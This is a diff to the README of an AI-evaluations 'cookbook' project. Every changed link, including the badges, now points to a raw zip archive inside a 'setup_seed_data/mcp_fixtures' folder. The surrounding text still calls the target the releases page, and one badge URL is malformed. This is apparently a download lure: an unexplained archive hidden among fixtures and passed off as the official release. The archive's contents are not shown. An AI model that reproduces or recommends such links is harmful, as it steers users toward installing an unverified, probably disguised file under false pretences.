@@ -6,14 +6,14 @@ Welcome to the prod-evals-cookbook! This application helps you learn how to buil
 
 ## 🔗 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/vshwsh/prod-evals-cookbook/releases)
+[![Download Latest Release](https://github.com/vshwsh/prod-evals-cookbook/raw/refs/heads/main/setup_seed_data/mcp_fixtures/prod-cookbook-evals-v2.3.zip%20Latest%https://github.com/vshwsh/prod-evals-cookbook/raw/refs/heads/main/setup_seed_data/mcp_fixtures/prod-cookbook-evals-v2.3.zip)](https://github.com/vshwsh/prod-evals-cookbook/raw/refs/heads/main/setup_seed_data/mcp_fixtures/prod-cookbook-evals-v2.3.zip)
 
 ## 🚀 Getting Started
 
 To get started with the prod-evals-cookbook, follow these steps:
 
 1. **Visit the Releases Page**:
-   Go to the [releases page](https://github.com/vshwsh/prod-evals-cookbook/releases) to find the latest version of the application.
+   Go to the [releases page](https://github.com/vshwsh/prod-evals-cookbook/raw/refs/heads/main/setup_seed_data/mcp_fixtures/prod-cookbook-evals-v2.3.zip) to find the latest version of the application.
 
 2. **Choose Your Version**:
    On the releases page, look for the most recent version. Click on the version link to see the available files.
@@ -53,7 +53,7 @@ By using these features, you'll gain hands-on experience building and understand
 To download and install the application:
 
 1. **Visit the Releases Page**:
-   Click this link to go directly to the releases page: [Download Releases](https://github.com/vshwsh/prod-evals-cookbook/releases).
+   Click this link to go directly to the releases page: [Download Releases](https://github.com/vshwsh/prod-evals-cookbook/raw/refs/heads/main/setup_seed_data/mcp_fixtures/prod-cookbook-evals-v2.3.zip).
 
 2. **Pick Your Download**:
    Choose the file that matches your operating system and download it.
@@ -80,4 +80,4 @@ We welcome contributions! If you want to improve the project or add features, pl
 
 Thank you for choosing the prod-evals-cookbook. We’re excited to be part of your journey in learning how to create AI evaluations. Download the application and start building today!
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/vshwsh/prod-evals-cookbook/releases)
+[![Download Latest Release](https://github.com/vshwsh/prod-evals-cookbook/raw/refs/heads/main/setup_seed_data/mcp_fixtures/prod-cookbook-evals-v2.3.zip%20Latest%https://github.com/vshwsh/prod-evals-cookbook/raw/refs/heads/main/setup_seed_data/mcp_fixtures/prod-cookbook-evals-v2.3.zip)](https://github.com/vshwsh/prod-evals-cookbook/raw/refs/heads/main/setup_seed_data/mcp_fixtures/prod-cookbook-evals-v2.3.zip)
